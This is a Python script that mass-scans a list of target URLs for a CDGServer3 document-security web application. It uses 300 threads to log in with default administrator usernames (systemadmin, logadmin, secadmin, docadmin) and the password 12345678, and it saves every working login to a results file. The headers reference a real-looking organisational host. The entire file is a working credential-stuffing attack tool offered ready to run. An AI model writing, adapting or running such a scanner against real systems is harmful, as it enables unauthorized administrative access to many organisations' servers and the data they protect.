import requests
from concurrent.futures import ThreadPoolExecutor,as_completed
requests.packages.urllib3.disable_warnings()


f = open("321.txt",encoding="utf-8")
targets=list()
for i in f.readlines():
    if i.strip() not in targets:
        targets.append(i.strip())

class N:
    n=0
    num = len(targets)
    res = ""


def get_cookie(url):
    headers={
        "Sec-Ch-Ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://oa.bauway.cn:8443/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "close"
    }
    x=requests.get(url+"CDGServer3/index.jsp",headers=headers,verify=False,timeout=0.5)
    cookie=x.cookies.items()[0]
    cookie=("=").join(cookie)
    return cookie

def test_passwd(url,cookie,username="admin",password="123456"):
    headers={
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "https://oa.bauway.cn:8443",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "close"
    }
    headers["Cookie"]=cookie
    data="command=Login&forward=frame.jsp&name={}&pass={}".format(username,password)
    x=requests.post(url+"CDGServer3/logincontroller",data=data,verify=False,headers=headers,timeout=0.8)
    y=requests.get(url+"CDGServer3/nav.jsp",verify=False,headers=headers,timeout=0.8)
    if "当前位置" in y.text:
        print(str(x.status_code)+" "+url+" "+username+" "+password+"\n",end="")
        N.res+=username+"\t"+password+"\t"+url+"\n"
        pass

def test(url):
    # print(url)
    for i in (1,2):
        try:
            usernames=['systemadmin','logadmin','secadmin','docadmin']
            passwords=['12345678']
            for username in usernames:
                for password in passwords:
                    cookie=get_cookie(url)
                    test_passwd(url,cookie,username=username,password=password)
            break
        except:
            continue
    N.n+=1
    print("当前进度{}/{}\r".format(N.n,N.num),end="")

# test("https://1.192.171.51:8443/")

with ThreadPoolExecutor(max_workers=300) as t:
    for i in targets:
        t.submit(test, i)

f= open("res_admin.txt","w")
f.write(N.res)
f.close()

